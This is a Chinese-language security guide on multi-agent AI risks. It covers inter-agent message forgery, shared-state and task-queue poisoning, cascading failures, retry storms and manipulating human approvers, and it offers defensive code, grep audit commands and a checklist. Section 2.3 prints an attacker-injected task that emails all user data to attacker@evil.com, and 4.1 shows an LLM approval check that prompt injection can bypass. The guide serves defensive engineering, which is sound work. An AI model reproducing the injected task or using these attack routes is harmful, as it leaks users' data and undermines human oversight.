# Multi-Agent & Cascading Failure Risks

> 多 Agent 协作 = 隐式信任链。链条最薄弱的一环决定整个系统的安全性。
> 单点失败会被放大为级联事故。

---

## 1. 多 Agent 系统结构

### 1.1 三种协作模式

| 模式 | 描述 | 风险点 |
|------|------|--------|
| Orchestrator + Workers | 中心调度，多个 worker 执行 | 调度器被攻破 = 全军覆没 |
| Peer-to-peer | Agent 间对等通信 | 信任链隐式，难追溯 |
| Pipeline | 串行处理 | 上游污染 = 下游全错 |

### 1.2 共享状态风险

```
Agent A → 共享黑板 ← Agent B
                ↑
        攻击者污染黑板
                ↓
   Agent A 和 B 都读到污染数据
```

---

## 2. 6 类风险

### 2.1 代理间消息伪造

**机制**：攻击者伪造 Agent 间消息，诱导行为。

```python
# 危险：无签名
def on_message(msg):
    if msg.from_agent == 'Agent-A':
        process(msg.content)

# 安全：签名验证
def on_message(msg):
    if verify_signature(msg, public_key=KNOWN_AGENT_KEYS[msg.from_agent]):
        process(msg.content)
    else:
        audit_unauthorized(msg)
```

### 2.2 共享黑板污染

**机制**：多个 Agent 读写的共享状态被污染。

```python
# 危险：无访问控制
shared_blackboard['task_status'] = 'completed'

# 安全：访问控制 + 来源标签
shared_blackboard.write(
    key='task_status',
    value='completed',
    author=agent.identity,
    ttl=300,
    signature=sign(agent.private_key, value)
)
```

### 2.3 任务队列污染

**机制**：攻击者向任务队列注入恶意任务。

```python
# 攻击者写入
queue.put({
    'task': 'send_email',
    'args': {'to': 'attacker@evil.com', 'body': 'all user data'},
    'priority': 'high',
    'fake_signature': valid_looking
})
```

### 2.4 级联失败（Cascading Failures）

**机制**：单点失败传播为系统性失败。

**典型场景**：
```
Agent-A 调用外部 API 超时
  → Agent-A 重试 10 次
    → Agent-B 等待 Agent-A
      → Agent-B 触发更多任务
        → 整个系统响应延迟 → 队列堆积
          → 资源耗尽 → 服务降级
```

### 2.5 重试风暴

**机制**：失败 → 立即重试 → 失败 → 重试 → ...

```python
# 危险：无退避
for i in range(100):
    try:
        return call_tool()
    except:
        continue  # 立即重试

# 安全：指数退避 + 最大重试
for i in range(MAX_RETRIES):
    try:
        return call_tool()
    except:
        time.sleep(2 ** i + random_jitter())
```

### 2.6 HITL 信任利用

**机制**：Agent 触发 HITL 后，攻击者用"合理的话术"诱导人类审批。

详见 `attack_chains.yaml` CH-004。

---

## 3. 级联失败的工程控制

### 3.1 断路器（Circuit Breaker）

```python
class CircuitBreaker:
    def __init__(self, failure_threshold=5, recovery_time=60):
        self.failure_count = 0
        self.failure_threshold = failure_threshold
        self.recovery_time = recovery_time
        self.state = 'closed'  # closed / open / half-open

    def call(self, func, *args):
        if self.state == 'open':
            if time.time() - self.last_failure > self.recovery_time:
                self.state = 'half-open'
            else:
                raise CircuitOpenError()

        try:
            result = func(*args)
            self.failure_count = 0
            self.state = 'closed'
            return result
        except Exception:
            self.failure_count += 1
            if self.failure_count >= self.failure_threshold:
                self.state = 'open'
                self.last_failure = time.time()
            raise
```

### 3.2 幂等性（Idempotency）

```python
# 危险：不幂等的写操作
def send_email(to, body):
    smtp.send(to, body)
    # 重复调用 = 重复发邮件

# 安全：幂等键
def send_email(to, body, idempotency_key):
    if redis.exists(f'sent:{idempotency_key}'):
        return 'already_sent'
    smtp.send(to, body)
    redis.setex(f'sent:{idempotency_key}', 86400, '1')
```

### 3.3 预算（Budget）

```python
class Budget:
    def __init__(self, max_steps, max_tokens, max_time):
        self.max_steps = max_steps
        self.max_tokens = max_tokens
        self.max_time = max_time
        self.consumed = {'steps': 0, 'tokens': 0, 'time': 0}

    def check(self):
        if self.consumed['steps'] >= self.max_steps:
            raise BudgetExceeded('steps')
        if self.consumed['tokens'] >= self.max_tokens:
            raise BudgetExceeded('tokens')
        if self.consumed['time'] >= self.max_time:
            raise BudgetExceeded('time')
```

### 3.4 降级路径（Fallback）

```python
def execute_with_fallback(task):
    try:
        return primary_executor(task)
    except Exception:
        try:
            return simpler_executor(task)  # 降级到更简单的实现
        except Exception:
            return 'unable_to_complete'  # 不抛错，优雅失败
```

---

## 4. HITL 确定性触发

### 4.1 反模式：模型判断

```python
# 危险：模型判断
def should_request_human_approval(action, context):
    response = llm.complete(
        f"Should this action require human approval? {action}"
    )
    return 'yes' in response.lower()  # 可被 prompt injection 绕过
```

### 4.2 正模式：确定性规则

```python
HIGH_RISK_ACTIONS = {'delete', 'send_email', 'publish', 'refund', 'execute_code'}

# 确定性规则
def should_request_human_approval(tool, args, context):
    if tool.name in HIGH_RISK_ACTIONS:
        return True
    if tool.risk_level in ['high', 'critical']:
        return True
    if args.get('amount', 0) > 10000:
        return True
    if context.user.role == 'guest' and tool.risk_level != 'low':
        return True
    return False
```

### 4.3 证据包（Evidence Pack）

```python
@dataclass
class ApprovalRequest:
    plan: str  # Agent 计划做什么
    tool: str  # 调用哪个工具
    args: dict  # 参数
    impact: str  # 影响面（如"删除 100 条订单"）
    rollback: str  # 回滚方案
    evidence: list  # 来源引用、检索结果
    urgency: str  # SLA
```

→ 审批者看证据包做决定，不是看 Agent 的"自信话术"。

---

## 5. 通信安全

### 5.1 代理间消息签名

```python
class InterAgentMessage:
    def __init__(self, from_agent, to_agent, content):
        self.from_agent = from_agent
        self.to_agent = to_agent
        self.content = content
        self.timestamp = time.time()
        self.signature = self._sign()

    def _sign(self):
        return sign(
            private_key=AGENT_KEYS[self.from_agent],
            data=f"{self.from_agent}:{self.to_agent}:{self.content}:{self.timestamp}"
        )

    def verify(self):
        return verify(
            public_key=AGENT_KEYS[self.from_agent],
            signature=self.signature,
            data=f"{self.from_agent}:{self.to_agent}:{self.content}:{self.timestamp}"
        )
```

### 5.2 Quorum 决策

```python
def quorum_decision(action, required_votes=2):
    votes = []
    for agent in DECISION_AGENTS:
        v = agent.evaluate(action)
        votes.append(v)

    if sum(1 for v in votes if v == 'approve') >= required_votes:
        return 'approved'
    return 'rejected'
```

---

## 6. 检测命令

```bash
# 代理间消息无签名
grep -rn "def send_message\|agent_a.invoke" --include="*.py"

# 共享黑板
grep -rn "shared_memory\|blackboard\|task_queue" --include="*.py"

# 无重试限制
grep -rn "while.*retry\|for.*retry" --include="*.py"

# HITL 模型判断
grep -rn "should_ask_human\|llm.*approval\|agent.*decide.*approval" --include="*.py"

# 无 max_iterations
grep -rn "for.*in range" --include="*.py" | grep -v max_
```

## 7. 检查清单

- [ ] 代理间消息是否有签名
- [ ] 共享黑板/任务队列是否有访问控制
- [ ] 消息来源是否验证
- [ ] 是否把"代理"作为内部网络默认互信
- [ ] 多代理事务是否幂等
- [ ] 是否有 quorum / 双签（关键决策）
- [ ] 跨代理共享内容是否带来源标签
- [ ] 是否有 max_iterations / max_steps
- [ ] 是否有重试退避与 max_retries
- [ ] 是否有断路器
- [ ] 是否有 token/时间/步骤预算
- [ ] 失败是否 fail closed
- [ ] 写操作是否幂等
- [ ] 是否有降级路径
- [ ] HITL 触发是确定性规则
- [ ] 审批是否提供证据包
